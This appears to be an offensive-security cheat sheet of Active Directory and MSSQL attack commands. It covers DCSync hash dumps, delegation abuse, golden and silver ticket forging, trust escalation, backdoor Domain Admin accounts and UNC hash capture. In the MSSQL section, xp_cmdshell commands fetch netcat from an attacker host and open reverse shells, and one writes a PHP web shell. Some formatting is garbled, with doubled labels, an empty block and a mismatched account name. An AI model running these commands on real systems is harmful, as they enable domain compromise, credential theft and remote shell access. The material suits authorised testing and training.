> [!notes] **OU & Container Mapping**
> Enumerate the Active Directory structural architecture to evaluate Group Policy (GPO) boundary placements.
> 
```bash
> bloodyAD --host 192.168.1.11 -d ignite.local -u administrator -p 'Ignite@987' get children --otype container
> ```

> [!notes] **Network Zone DNS Dump**
> Extract internal active DNS records filelessly to map hidden endpoints, staging servers, and subnet bridges.
> 
```bash
> bloodyAD --host 192.168.1.11 -d ignite.local -u administrator -p 'Ignite@987' get dnsDump
> ```

---

## 👥 Phase 2 — Privilege & Membership Analysis

> [!notes] **Individual Group Scoping**
> Inspect the structural security groups a target user account currently inherits or holds direct access to.
> 
```bash
> bloodyAD --host 192.168.1.11 -d ignite.local -u administrator -p 'Ignite@987' get membership raj
> ```

> [!notes] **High-Privilege Roster Dumping**
> Query the explicit `member` attributes of the Domain Admins group to isolate highly privileged accounts.
> 
```bash
> bloodyAD --host 192.168.1.11 -d ignite.local -u administrator -p 'Ignite@987' get object "Domain Admins" --attr member
> ```

> [!notes] **Deep LDAP Attribute Inspection**
> Dump all properties from a target user's schema data to catch cleartext backdoors, descriptions, or administrative tracking bits.
> 
```bash
> bloodyAD -d ignite.local -u administrator -p Ignite@987 --host 192.168.1.11 get object aaru
> ```

---

## ⚙️ Phase 3 — Account Management Attacks

> [!notes] **Account Disabling Control**
> Toggle User Account Control flags to apply an administrative lock on an active user account.
> 
```bash
> bloodyAD --host 192.168.1.11 -d ignite.local -u Administrator -p 'Ignite@987' add uac tom -f ACCOUNTDISABLE
> ```

> [!notes] **Account Enabling Control**
> Strip away the restriction flag to cleanly restore or verify active authentication capabilities on a user account.
> 
```bash
> bloodyAD --host 192.168.1.11 -d ignite.local -u Administrator -p 'Ignite@987' remove uac tom -f ACCOUNTDISABLE
> ```

> [!notes] **Machine Account Quota (MAQ) Triage**
> Read the root domain descriptor property to check if standard users can spin up fresh computer objects.
> 
```bash
> bloodyAD --host 192.168.1.11 -d ignite.local -u Administrator -p 'Ignite@987' get object "DC=ignite,DC=local" --attr ms-DS-MachineAccountQuota
> ```

---

## 🏹 Phase 4 — Kerberos-Based Attacks

> [!notes] **SPN Modification (Kerberoasting Setup)**
> Write a fake Service Principal Name to a target account to make it targetable via Kerberoasting engines.
> 
```bash
> bloodyAD --host 192.168.1.11 -d ignite.local -u Administrator -p 'Ignite@987' set object raj servicePrincipalName -v 'ignite/hackingarticles'
> ```

> [!notes] **Kerberoastable Account Hunting**
> Sweep the domain using LDAP search filters to locate all non-disabled accounts carrying custom SPN attributes.
> 
```bash
> bloodyAD --host 192.168.1.11 -d ignite.local -u administrator -p 'Ignite@987' get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
> ```

> [!notes] **AS-REP Roasting Activation**
> Disable mandatory Kerberos pre-authentication flags on a user account to capture a crackable hash over the wire.
> 
```bash
> bloodyAD --host 192.168.1.11 -d ignite.local -u administrator -p Ignite@987 add uac yashika -f DONT_REQ_PREAUTH
> ```

> [!notes] **AS-REP Roasting Hash Extraction**
> Extract the crackable cipher suite ticket for accounts that do not require pre-authentication using Impacket.
> 
```bash
> impacket-GetNPUsers ignite.local/yashika -dc-ip 192.168.1.11 -no-pass
> ```

---

## 🔨 Phase 5 — User & Credential Manipulation

> [!notes] **New User Creation**
> Provision a fresh user account directly inside the Active Directory database.
> 
```bash
> bloodyAD -d ignite.local -u administrator -p Ignite@987 --host 192.168.1.11 add user kinjal Password@1
> ```

> [!notes] **Object Profile Verification**
> Read back the newly initialized user object parameters via LDAP to ensure proper placement.
> 
```bash
> bloodyAD --host 192.168.1.11 -d ignite.local -u administrator -p Ignite@987 get object kinjal
> ```

> [!notes] **Expose LAPS Registry Passwords**
> Query LAPS attributes across computer records to harvest cleartext local administrator strings.
> 
```bash
> bloodyAD --host "192.168.1.11" -d "ignite.local" -u "aarti" -p "Password@1" get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
> ```

> [!notes] **Mass Password/Description Scraping**
> Audit domain properties to find cleartext passwords mistakenly typed into description fields.
> 
```bash
> bloodyAD -u raj -p 'Password@1' -d ignite.local --host 192.168.1.48 get search --filter '(|(userPassword=*)(description=*))' --attr userPassword,description
> ```

---

## 🔑 Phase 6 — DCSync Attack Path

> [!notes] **Grant Replication Rights**
> Inject complete directory replication rights (`GetChangesAll`) onto a controlled user account.
> 
```bash
> bloodyAD -d ignite.local -u administrator -p Ignite@987 --host 192.168.1.11 add dcsync kinjal
> ```

> [!notes] **Execute DCSync Hash Dump**
> Masquerade as a Domain Controller using Impacket to dump the domain's entire NT hash vault database.
> 
```bash
> impacket-secretsdump ignite.local/kinjal:Password@1@192.168.1.11
> ```

> [!notes] **Revoke Replication Rights**
> Strip away the directory replication rights from the user account to return the domain to a clean state.
> 
```bash
> bloodyAD -d ignite.local -u administrator -p Ignite@987 --host 192.168.1.11 remove dcsync kinjal
> ```

---

## 🎭 Phase 7 — AD ACL Abuse Techniques

> [!notes] **Abuse ForceChangePassword Rights**
> Forcibly overwrite an account's password string without needing to know or verify their current credential.
> 
```bash
> bloodyAD -d ignite.local -u natasha -p Password@1 --host 192.168.1.11 set password hulk Ironman@123
> ```

> [!notes] **Validate Password Reset via LDAP**
> Authenticate via NetExec to quickly verify the new password baseline.
> 
```bash
> nxc ldap 192.168.1.11 -u hulk -p Ironman@123
> ```

> [!notes] **Grant GenericAll on Security Groups**
> Modify group access descriptors to grant an account full configuration control over a target security group.
> 
```bash
> bloodyAD --host 192.168.1.11 -d ignite.local -u administrator -p Ignite@987 add genericAll "CN=Domain Admins,CN=Users,DC=ignite,DC=local" aaru
> ```

> [!notes] **Abuse GenericAll to Join Group**
> Leverage the newly assigned control permissions to inject an account straight into the Domain Admins group.
> 
```bash
> bloodyAD --host "192.168.1.11" -d "ignite.local" -u "aaru" -p "Password@1" add groupMember "Domain Admins" "aaru"
> ```

---

## 🔀 Phase 8 — Resource-Based Constrained Delegation (RBCD)

> [!notes] **Create Fake Computer Account**
> Abuse default domain privileges to register a new machine account to act as the delegation bridge head.
> 
```bash
> bloodyAD -u geet -p 'Password@1' -d ignite.local --host 192.168.1.11 add computer fakecomp 'Password@123'
> ```

> [!notes] **Configure RBCD Impersonation Pathway**
> Write the fake computer's SID into the Domain Controller's `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute.
> 
```bash
> bloodyAD --host 192.168.1.11 -u geet -p 'Password@1' -d ignite.local add rbcd 'DC$' 'fakecomp$'
> ```

> [!notes] **Request Constrained Impersonation Ticket**
> Execute an S4U Kerberos ticket transaction to impersonate a Domain Administrator over the target DC service.
> 
```bash
> impacket-getST ignite.local/'fakepc$':Password@123 -spn cifs/DC.ignite.local -impersonate administrator -dc-ip 192.168.1.11
> ```

> [!notes] **Pass-the-Ticket Command Shell**
> Export the recovered ccache service ticket payload to drop into an administrative command console.
> ```bash
> export KRB5CCNAME=administrator@cifs_dc.ignite.local@IGNITE.LOCAL.ccache
> impacket-psexec ignite.local/administrator@DC.ignite.local -k -no-pass -dc-ip 192.168.1.11
> ```

---

## 👤 Phase 9 — Shadow Credentials Attack

> [!notes] **Register Public Key Mapping**
> Inject a fresh certificate configuration directly into a target computer's `msDS-KeyCredentialLink` property.
> ```bash
> bloodyAD --host 192.168.1.11 -u sita -p Password@1 -d ignite.local add shadowCredentials DC$
> ```
```

> [!example] 🪟 PowerShell: Forcing Domain Object Security Secret Resets via Write Configuration Rights Abuses
> 
> Abuses GenericAll or GenericWrite permissions on a target user object to force a password reset and hijack the account.
> 
> PowerShell
> 
> PowerShell
> 
> ```
> Set-DomainUserPassword -Identity targetuser \
>      -AccountPassword (ConvertTo-SecureString 'Hacked123!' -AsPlainText -Force) \
>      -Credential $cred
> ```

> [!example] 🪟 PowerShell: Direct Account Propagation into Privileged Security Group Objects Structures
> 
> Abuses WriteDacl or WriteOwner privileges on a target group to inject an account straight into the Domain Admins group.
> 
> PowerShell
> 
> PowerShell
> 
> ```
> Add-DomainGroupMember -Identity "Domain Admins" -Members stephanie
> Get-DomainGroupMember -Identity "Domain Admins"
> ```

> [!example] 🪟 PowerShell: Forcing Arbitrary Assignment of DCSync Security Rights over Active Domain Controllers
> 
> Modifies the access control lists on the domain object to grant an account explicit DCSync replication permissions.
> 
> PowerShell
> 
> PowerShell
> 
> ```
> Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" -PrincipalIdentity stephanie -Rights DCSync
> ```

> [!example] 🪟 PowerShell: Resetting Target Domain Accounts Access Strings via ForceChangePassword Rights
> 
> Overrides target account credentials directly using explicit `ForceChangePassword` execution rights.
> 
> PowerShell
> 
> PowerShell
> 
> ```
> Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)
> ```

> [!example] 🪟 PowerShell: Modifying Domain Object Identity Security Owner Context Parameters to Gain System Permissions
> 
> Hijacks ownership of an object to grant an account full write privileges over its underlying properties.
> 
> PowerShell
> 
> PowerShell
> 
> ```
> Set-DomainObjectOwner -Identity targetobject -OwnerIdentity stephanie
> Add-DomainObjectAcl -TargetIdentity targetobject -PrincipalIdentity stephanie -Rights All
> ```

> [!example] 🐧 Linux Bash: Inbound Resource-Based Constrained Delegation Attacks (Step 1: Injected Machine Generation Account)
> 
> Injects a new computer object into the domain to exploit Resource-Based Constrained Delegation (RBCD) flaws.
> 
> Bash
> 
> Bash
> 
> ```
> addcomputer.py -computer-name 'ATTACKPC$' -computer-pass 'Attack123!' \
>      'corp.local/stephanie:Password123' -dc-ip 192.168.x.100
> ```

> [!example] 🐧 Linux Bash: Modifying Computer Objects Allowed-To-Act Delegation Security Permissions Matrix (Step 2: RBCD Setup)
> 
> Configures the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute on a target machine to allow the new fake computer object to impersonate users.
> 
> Bash
> 
> Bash
> 
> ```
> rbcd.py -delegate-to <TARGET_COMPUTER>$ -delegate-from ATTACKPC$ \
>      -dc-ip 192.168.x.100 -action write 'corp.local/stephanie:Password123'
> ```

> [!example] 🐧 Linux Bash: Requesting an Impersonated Service Ticket for Corporate Target Hosts Ingress Access (Step 3: RBCD Ingress)
> 
> Requests a service ticket (TGS) for the CIFS service on the target machine, impersonating a Domain Administrator via S4U protocols.
> 
> Bash
> 
> Bash
> 
> ```
> getST.py -spn cifs/<TARGET_FQDN> -impersonate Administrator \
>      'corp.local/ATTACKPC$:Attack123!' -dc-ip 192.168.x.100
> ```

> [!example] 🐧 Linux Bash: Executing Administrative Code Processes over Compromised RBCD Shared Host Mounts (Step 4: Final DA Shell)
> 
> Exports the impersonated service ticket to gain full administrative command control or extract hashes from the compromised target machine.
> 
> Bash
> 
> Bash
> 
> ```
> export KRB5CCNAME=Administrator@cifs_<TARGET_FQDN>@CORP.LOCAL.ccache
> secretsdump.py -k -no-pass corp.local/Administrator@<TARGET_FQDN>
> psexec.py -k -no-pass corp.local/Administrator@<TARGET_FQDN>
> ```

### Constrained Delegation Abuse

> [!check] 🪟 PowerShell: Searching the Domain Schema for Accounts Assigned Trusted-To-Authentication Privileges
> 
> Searches the domain to find computers or users configured with Constrained Delegation access allowances (`msDS-AllowedToDelegateTo`).
> 
> PowerShell
> 
> PowerShell
> 
> ```
> Get-DomainUser -TrustedToAuth | select samaccountname,msDS-AllowedToDelegateTo
> Get-DomainComputer -TrustedToAuth | select name,msDS-AllowedToDelegateTo
> ```

> [!example] 🐧 Linux Bash: Exploiting Constrained Delegation Objects via S4U Service Ticket Generation Loops
> 
> Abuses delegation settings to request a service ticket for a target host as a Domain Administrator, executing commands via Kerberos.
> 
> Bash
> 
> Bash
> 
> ```
> getST.py -spn cifs/<TARGET_FQDN> -impersonate Administrator \
>      -dc-ip 192.168.x.100 'corp.local/<DELEG_USER>:<DELEG_PASS>'
> export KRB5CCNAME=Administrator@cifs_<TARGET_FQDN>@CORP.LOCAL.ccache
> psexec.py -k -no-pass corp.local/Administrator@<TARGET_FQDN>
> ```

### Unconstrained Delegation Abuse

> [!check] 🪟 PowerShell: Scanning Domain Compute Nodes to Identify Unconstrained Delegation Configurations Weaknesses
> 
> Identifies domain systems configured with Unconstrained Delegation that cache privileged tickets when users authenticate to them.
> 
> PowerShell
> 
> PowerShell
> 
> ```
> Get-DomainComputer -Unconstrained | select name,dnshostname
> ```

> [!example] 💾 Windows CMD: Launching Active Monitoring Infrastructure Arrays targeting Incoming Security Token Transactions
> 
> Monitors system memory on an unconstrained host to capture TGTs from incoming privileged connections (such as domain controllers).
> 
> DOS
> 
> DOS
> 
> ```
> .\Rubeus.exe monitor /interval:5 /filteruser:DC$
> ```

> [!example] 🐧 Linux Bash: Coercing High-Privilege Domain Assets Connection Streams via Legacy Spooler Protocols (PrinterBug)
> 
> Forces a domain controller account to authenticate back to an unconstrained host via the print spooler bug, caching its machine TGT in memory.
> 
> Bash
> 
> Bash
> 
> ```
> python3 printerbug.py corp.local/stephanie:'Password123'@<DC_IP> <UNCONS_DELEG_IP>
> ```

> [!example] 🐧 Linux Bash: Coercing Direct Inbound Domain Controller Connections via Alternate Network Shares (PetitPotam)
> 
> Uses PetitPotam to coerce encrypted authentication traffic from a domain controller back to a target listener host.
> 
> Bash
> 
> Bash
> 
> ```
> python3 PetitPotam.py -u stephanie -p 'Password123' <UNCONS_DELEG_IP> <DC_IP>
> ```

## Phase 6: Domain Dominance

> [!example] 🐧 Linux Bash: Forging Corporate Golden Tickets Identities Sessions
> 
> Forges a Golden Ticket (TGT) using the domain SID and decrypted `krbtgt` account hash to gain persistent, unrestricted access across the entire forest.
> 
> Bash
> 
> Bash
> 
> ```
> lookupsid.py corp.local/user:'pass'@192.168.x.100 | grep "Domain SID"
> ticketer.py -nthash <KRBTGT_NTLM_HASH> -domain-sid S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX -domain corp.local Administrator
> export KRB5CCNAME=Administrator.ccache
> psexec.py -k -no-pass corp.local/Administrator@<DC_FQDN>
> ```


>[!check] Attacking Domain Trusts Child->Parent Trusts-from Windows

```
# ==============================================================================
# 1. RECONNAISSANCE & INFORMATION GATHERING
# ==============================================================================

# Extract the child domain's KRBTGT account NT hash via DCSync
mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt

# Get the SID for the current child domain using PowerView
Get-DomainSID

# Get the Enterprise Admins group SID from the parent domain using PowerView
Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid

# Alternative built-in method to get the parent Enterprise Admins group SID
Get-ADGroup -Identity "Enterprise Admins" -Server "INLANEFREIGHT.LOCAL"


# ==============================================================================
# 2. VERIFICATION & POST-EXPLOITATION TESTING
# ==============================================================================

# Test for administrative access to the parent Domain Controller's file share
ls \\academy-ea-dc01.inlanefreight.local\c$

# Check current session memory to confirm the forged Kerberos ticket is injected
klist


# ==============================================================================
# 3. EXTRASIDS ATTACK CONFIGURATIONS (GOLDEN TICKET GENERATION)
# ==============================================================================

# Method A: Forge and inject the Golden Ticket into memory using Mimikatz
mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt

# Method B: Forge and inject the Golden Ticket into memory using Rubeus
.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt


# ==============================================================================
# 4. PARENT DOMAIN EXPLOITATION (DCSYNC)
# ==============================================================================

# Perform DCSync against the parent domain to dump target admin credentials
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm

# Perform DCSync while explicitly targeting the parent FQDN to ensure accurate routing
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
```

>[!check] ParentChildTrust Linux
```
# 1. Extract the Child Domain KRBTGT NTLM Hash via DCSync
secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt

# 2. Extract the Child Domain SID
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"

# 3. Extract the Parent Domain SID and verify the Enterprise Admins RID (519)
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"

# 4. Forge the Golden Ticket injecting the Parent Enterprise Admins SID into ExtraSids
ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker

# 5. Load the forged ticket into your current terminal session environment
export KRB5CCNAME=hacker.ccache

# 6. Execute lateral movement to pop a SYSTEM shell on the Parent Domain Controller
psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5

# ALTERNATIVE: Automate steps 1 through 6 entirely using raiseChild
raiseChild.py -target-exec 172.16.5.5 -child-fqdn LOGISTICS.INLANEFREIGHT.LOCAL -clear-passwords INLANEFREIGHT.LOCAL/administrator

```

> [!check] cross forest trust abuse 
````
 
````

> [!example] 💾 Windows CMD: Native Assembly Forging of Persistent Active Directory Corporate Golden Tickets
> 
> Generates and injects a custom Golden Ticket directly into local volatile memory using Mimikatz.
> 
> DOS
> 
> DOS
> 
> ```
> kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-XXX /krbtgt:<KRBTGT_NTLM_HASH> /ptt
> misc::cmd
> ```

> [!example] 🐧 Linux Bash: Crafting Targeted Corporate Silver Tickets for Specific Host Resource Channel Interceptions
> 
> Forges a Silver Ticket (TGS) using a target machine account's NTLM hash to bypass authentication and access specific services (like CIFS).
> 
> Bash
> 
> Bash
> 
> ```
> ticketer.py -nthash <SERVICE_ACCOUNT_NTLM> -domain-sid S-1-5-21-XXX -domain corp.local -spn cifs/<TARGET_FQDN> Administrator
> export KRB5CCNAME=Administrator.ccache
> smbclient.py -k -no-pass //<TARGET_FQDN>/C$
> ```

> [!check] 🐧 Linux Bash: Mass Extraction Triage Dump of Corporate Domains Configuration Parameters Secrets
> 
> Performs a complete database dump against a domain controller to extract all domain user hashes for storage or offline analysis.
> 
> Bash
> 
> Bash
> 
> ```
> secretsdump.py corp.local/Administrator:'pass'@192.168.x.100 -just-dc
> secretsdump.py -hashes <LM>:<NTLM> corp.local/Administrator@192.168.x.100
> ```

> [!example] 🪟 PowerShell: Injecting Persistent Local Accounts Entities inside the Wide Active Directory Schema Trees
> 
> Creates a backdoor domain user and adds it to the Domain Admins group to establish persistent administrative access.
> 
> PowerShell
> 
> PowerShell
> 
> ```
> net user backdoor P@ssw0rd! /add /domain
> net group "Domain Admins" backdoor /add /domain
> ```

# MSSQL — RCE & LATERAL MOVEMENT

> [!abstract] 🌳 Markdown List: MSSQL Infrastructure Threat Vector Footprint Capabilities Checklist
> 
> Overview of key technical capabilities and attack vectors available upon discovering an accessible MSSQL database engine.
> 
> Plaintext
> 
> ```
> - Execute operating system commands via xp_cmdshell (requires SA or sysadmin roles)
> - Move laterally across isolated network subnets by exploiting server links
> - Capture NetNTLM hashes by forcing outbound connections via UNC path injection
> - Escalate privileges inside database sessions through login impersonation rights
> ```

## Step 1: Connect to MSSQL

> [!check] 🐧 Linux Bash: Remote Authenticated Inbound Database Context Connection Mapping over Networks
> 
> Connects to a remote SQL instance from a Linux host using Windows domain tokens or database account profiles.
> 
> Bash
> 
> Bash
> 
> ```
> mssqlclient.py corp.local/sa@<TARGET_IP> -windows-auth
> mssqlclient.py sa@<TARGET_IP>                          # Authenticates using native SQL accounts
> mssqlclient.py corp.local/user:'pass'@<TARGET_IP> -windows-auth
> ```

> [!check] 💾 Windows CMD: Local Endpoint Inline Structural Transact-SQL Connection Execution Engines
> 
> Connects and submits transactional queries directly to a local or remote SQL engine via native command-line options.
> 
> DOS
> 
> DOS
> 
> ```
> sqlcmd -S <TARGET_IP> -U sa -P password -Q "SELECT @@version"
> ```

> [!check] 🪟 PowerShell: Automated Domain-Wide SQL Engine Authentication Capability Mapping Scripts
> 
> Uses PowerUpSQL to scan the network subnet, mapping available SQL instances and testing for accessible connection vulnerabilities.
> 
> PowerShell
> 
> PowerShell
> 
> ```
> . .\PowerUpSQL.ps1
> Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
> ```

## Step 2: Enumerate MSSQL

> [!info] 𗁤 SQL Script: In-Database Security Roles Mapping and Environment Variable Tracking Lookups
> 
> Queries instance details, active user properties, sysadmin status roles, local database names, and execution rights.
> 
> SQL
> 
> SQL
> 
> ```
> SELECT @@version;
> SELECT SYSTEM_USER;    -- Returns the active SQL login context name
> SELECT USER_NAME();    -- Returns the database session user mapping
> SELECT IS_SRVROLEMEMBER('sysadmin');    -- Returns 1 if the user holds sysadmin privileges
> 
> -- Enumerates all local databases within the instance:
> SELECT name FROM master.dbo.sysdatabases;
> 
> -- Lists instance usernames and core security properties:
> SELECT name, type_desc FROM master.sys.server_principals;
> SELECT IS_SRVROLEMEMBER('sysadmin', name) AS is_sa, name FROM master.sys.server_principals WHERE type = 'S';
> 
> -- Checks if the active account holds explicit impersonation privileges over other logins:
> SELECT distinct b.name FROM sys.server_permissions a
> INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
> WHERE a.permission_name = 'IMPERSONATE';
> 
> -- Identifies linked database infrastructure parameters across networks:
> SELECT srvname, srvproduct, isremote FROM master..sysservers;
> EXEC sp_linkedservers;
> ```

## Step 3: Enable xp_cmdshell (if sysadmin)

> [!example] 𗁤 SQL Script: Reconfiguring Global In-Database Environment Variables to Enable Operating System Command Injection Handlers
> 
> Modifies advanced options configuration parameters to activate `xp_cmdshell`, enabling direct operating system command execution through the database engine.
> 
> SQL
> 
> SQL
> 
> ```
> -- Evaluates current execution state variables for xp_cmdshell:
> SELECT value FROM sys.configurations WHERE name = 'xp_cmdshell';
> 
> -- Modifies global server options to enable operating system processing commands:
> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
> 
> -- Executes system administrative queries via the shell primitive:
> EXEC xp_cmdshell 'whoami';
> EXEC xp_cmdshell 'net user';
> EXEC xp_cmdshell 'ipconfig';
> 
> -- Spawns a reverse shell connection by executing an inline base64 PowerShell payload:
> EXEC xp_cmdshell 'powershell -nop -w hidden -enc <BASE64_PAYLOAD>';
> 
> -- Downloads and runs standalone netcat executables to establish command line access paths:
> EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest http://<LHOST>/nc.exe -OutFile C:\Windows\Temp\nc.exe"';
> EXEC xp_cmdshell 'C:\Windows\Temp\nc.exe <LHOST> 4444 -e cmd';
> 
> -- Injects a backdoor user into the local administrator group:
> EXEC xp_cmdshell 'net user hax P@ss123! /add && net localgroup administrators hax /add';
> ```

## Step 4: Impersonation Attack (non-sysadmin ➔ sysadmin)

> [!example] 𗁤 SQL Script: Escalating Local Database Sessions Access via Impersonation Tokens Modification Abuses
> 
> Abuses explicit IMPERSONATE configuration permissions to escalate a standard database session into a privileged sysadmin context.
> 
> SQL
> 
> SQL
> 
> ```
> -- Validates target usernames available for local context impersonation:
> SELECT distinct b.name FROM sys.server_permissions a
> INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
> WHERE a.permission_name = 'IMPERSONATE';
> 
> -- Switches session authorization context into the administrative 'sa' profile:
> EXECUTE AS LOGIN = 'sa';
> SELECT IS_SRVROLEMEMBER('sysadmin');    -- Verifies if sysadmin status now evaluates to 1
> 
> -- Activates system command handlers under the elevated context:
> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
> EXEC xp_cmdshell 'whoami';
> 
> -- Drops the elevated context token to restore default session settings:
> REVERT;
> ```

## Step 5: Linked Server Lateral Movement

> [!example] 𗁤 SQL Script: Horizontal Multi-Hop Target Database Clusters Compromise Loops
> 
> Abuses linked server configurations to execute commands and step laterally into isolated database instances across network segments.
> 
> SQL
> 
> SQL
> 
> ```
> -- Lists available external database connections linked to the local instance:
> EXEC sp_linkedservers;
> SELECT srvname, isremote FROM master..sysservers;
> 
> -- Submits open queries to verify system user settings across an initial server link (MS01 → MS02):
> SELECT * FROM OPENQUERY("<LINKED_SERVER_NAME>", 'SELECT @@version, @@servername, SYSTEM_USER');
> SELECT * FROM OPENQUERY("MS02\SQLEXPRESS", 'SELECT IS_SRVROLEMEMBER(''sysadmin'')');
> 
> -- Executes operating system commands remotely across the server link:
> EXEC ('xp_cmdshell ''whoami''') AT [MS02\SQLEXPRESS];
> -- Alternative method submitting queries over OPENROWSET configurations:
> SELECT * FROM OPENQUERY("MS02\SQLEXPRESS", 'EXEC xp_cmdshell ''whoami''');
> 
> -- Remotely activates advanced options and shell commands on the linked server if disabled:
> EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [MS02\SQLEXPRESS];
> EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [MS02\SQLEXPRESS];
> EXEC ('xp_cmdshell ''powershell -enc <BASE64_PAYLOAD>''') AT [MS02\SQLEXPRESS];
> 
> -- Executes nested command strings across multiple database hops (MS01 → MS02 → MS03):
> EXEC ('EXEC (''xp_cmdshell ''''whoami'''''') AT [MS03]') AT [MS02\SQLEXPRESS];
> 
> -- Forces the remote linked instance to download and execute an outbound reverse shell payload:
> EXEC ('xp_cmdshell ''powershell -c "Invoke-WebRequest http://<LHOST>/nc.exe -OutFile C:\Windows\Temp\nc.exe; C:\Windows\Temp\nc.exe <LHOST> 5555 -e cmd"''') AT [MS02\SQLEXPRESS];
> ```

## Step 6: UNC Path Injection ➔ Hash Capture

> [!abstract] 🐧 Linux Bash: Preparing Inbound Network Share Traffic Capturing Engines
> 
> Starts Responder on the local network interface to intercept NetNTLM password hashes generated by forced outbound connections.
> 
> Bash
> 
> Bash
> 
> ```
> sudo responder -I tun0 -v
> ```

> [!example] 𗁤 SQL Script: Forcing Remote Database Engines Outbound Access Connection to Attacker Mounts
> 
> Abuses file checking stored procedures (`xp_dirtree`) to force the SQL service account to authenticate against an attacker-controlled SMB share, leaking its hash.
> 
> SQL
> 
> SQL
> 
> ```
> EXEC xp_dirtree '\\<LHOST>\share';
> EXEC xp_fileexist '\\<LHOST>\share\file';
> -- Injection variation pattern used within vulnerable web application input fields:
> '; EXEC xp_dirtree '\\<LHOST>\x'; --
> ```

> [!check] 🐧 Linux Bash: Running Decryption Attacks against Captured NetNTLMv2 Network Exchanges
> 
> Uses Hashcat to crack intercepted NetNTLMv2 hashes offline via dictionary attacks.
> 
> Bash
> 
> Bash
> 
> ```
> hashcat -m 5600 netntlm.txt /usr/share/wordlists/rockyou.txt
> ```

> [!example] 🐧 Linux Bash: Deploying In-Network NTLM Relay Authentication Hijacking Servers Loops
> 
> Relays intercepted network hashes directly to target hosts where SMB signing is disabled to execute commands automatically.
> 
> Bash
> 
> Bash
> 
> ```
> sudo python3 ntlmrelayx.py -t smb://<TARGET_IP> -smb2support
> ```

## Step 7: Read/Write Files via MSSQL

> [!note] 𗁤 SQL Script: Arbitrary Local File System Ingestion via Bulk Insert Row Operation Providers
> 
> Uses bulk selection commands to read internal files from disk and store their text contents into temporary database tables.
> 
> SQL
> 
> SQL
> 
> ```
> BULK INSERT ##tempcsv FROM 'C:\Windows\System32\drivers\etc\hosts' WITH (ROWTERMINATOR = '\n', FIELDTERMINATOR = ',');
> SELECT * FROM ##tempcsv;
> 
> -- Alternative row open queries used to read file strings without full table generation:
> SELECT * FROM OPENROWSET(BULK N'C:\Windows\System32\drivers\etc\hosts', SINGLE_CLOB) t;
> SELECT * FROM OPENROWSET(BULK N'C:\inetpub\wwwroot\web.config', SINGLE_CLOB) t;
> 
> -- Overwrites filesystem targets using command line redirections via active shell privileges:
> EXEC xp_cmdshell 'echo ^<?php system($_GET["cmd"]); ?^> > C:\inetpub\wwwroot\cmd.php';
> ```

## MSSQL Full Attack Decision Tree

> [!quote] 🌳 Logic Diagram: SQL Server Environment Compromise Lifecycle Path Blueprint
> 
> Complete tactical roadmap for evaluating an open MSSQL port from discovery to remote code execution and pivoting.
> 
> Plaintext
> 
> ```
> MSSQL Service Discovered (Port 1433 or 1434 UDP)
>          │
>          ▼
> Test default/discovered instance credentials:
>      sa : (blank / empty password strings)
>      sa : sa
>      sa : password
>      sa : Password123
>      <hostname> : <hostname>
>      <domain_user> : <known_pass_string>
>          │
>      ┌───┴───┐
>      │       │
>   Sysadmin? Not Sysadmin?
>      │       │
>      │       ▼
>      │   Check IMPERSONATE permissions rights
>      │   → Can impersonate SA context? → EXECUTE AS LOGIN='sa'
>      │   → Privilege escalated to sysadmin!
>      │       │
>      ▼       ▼
> Enable advanced options → invoke xp_cmdshell → Execute commands on local server
>          │
>          ▼
> Query linked server configurations (sp_linkedservers)
>          │
>      ┌───┴────────────────────────────┐
>      │                                │
>  No Links Found                   Active Server Links Identified
>      │                                │
>      │                                Execute statements across the link
>      │                                → Remotely invoke xp_cmdshell
>      │                                → Gain shell access on internal hosts (MS02/DC)
>      │
>      ▼
> Trigger UNC path injection → intercept via Responder → crack NetNTLMv2 hash
> → Or relay authentication traffic directly to adjacent systems if SMB signing is disabled
> ```

# PIVOTING & TUNNELING

## When Do You Need to Pivot?

> [!quote] 🌳 Mappings: Host Network Separation Identification Checklist
> 
